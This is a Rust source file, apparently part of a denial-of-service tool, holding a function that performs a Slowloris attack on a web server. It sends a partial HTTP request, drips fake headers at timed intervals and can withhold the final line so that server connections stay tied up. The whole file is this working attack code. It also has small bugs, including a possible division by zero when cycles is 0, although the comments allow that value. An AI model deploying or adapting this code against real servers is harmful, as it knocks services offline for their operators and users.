// For std::thread::sleep_ms.
#![allow(deprecated)]

use std::io::{Write};
use std::thread::sleep_ms;

/// request_attack performs a SlowLoris style delay request attack against a server
/// which can be written to via the given `connection` (reader/writer). 
/// `timeout` is the total time for the attack to progress, in milliseconds.
/// `cycles` is the number of times a new fake header should be written, or 0 for no additional headers.
/// `finalize` sets whether or not to send the terminating `\r\n`, and `post` changes the verb from GET to POST.
/// `threadn` is the thread number of this thread.
pub fn slowloris_attack<T: Sized + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool, post: bool, threadn: usize) {
    // Start a valid HTTP request
    let initial_request = if post {b"POST / HTTP/1.0\r\n"} else {b"GET  / HTTP/1.0\r\n"};
    connection.write_all(initial_request)
        .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write GET request: {}", threadn, e); panic!();});
    info!("[REQUEST:{}] Wrote {} request.", threadn, if post {"POST"} else {"GET"});

    // Delay cycle
    // Conditional here limits requests to one per ten milliseconds
    let real_cycles = if cycles < timeout/10 {cycles} 
                      else {info!("[REQUEST] Too many cycles! Limiting."); timeout/10};
    info!("[REQUEST:{}] Beginning delay attack: {} ms, {} cycles, {} ms/cycle.", threadn, timeout, real_cycles, timeout/real_cycles);
    for _ in 0..(real_cycles) {
        // Timeout / cycles gives the number of ms for one cycle
        sleep_ms(timeout / cycles);
        connection.write_all(b"X-Not-Real: \"Some Bullshit\"\r\n")
            .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write header. {}", threadn, e); panic!();});
    }

    if finalize {
        connection.write_all(b"\r\n")
            .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write finalizer. {}", threadn, e); panic!();});
        info!("[REQUEST:{}] Wrote finalizer.", threadn);
    } else {
        info!("[REQUEST:{}] Terminating without finalizer.", threadn);
    }
}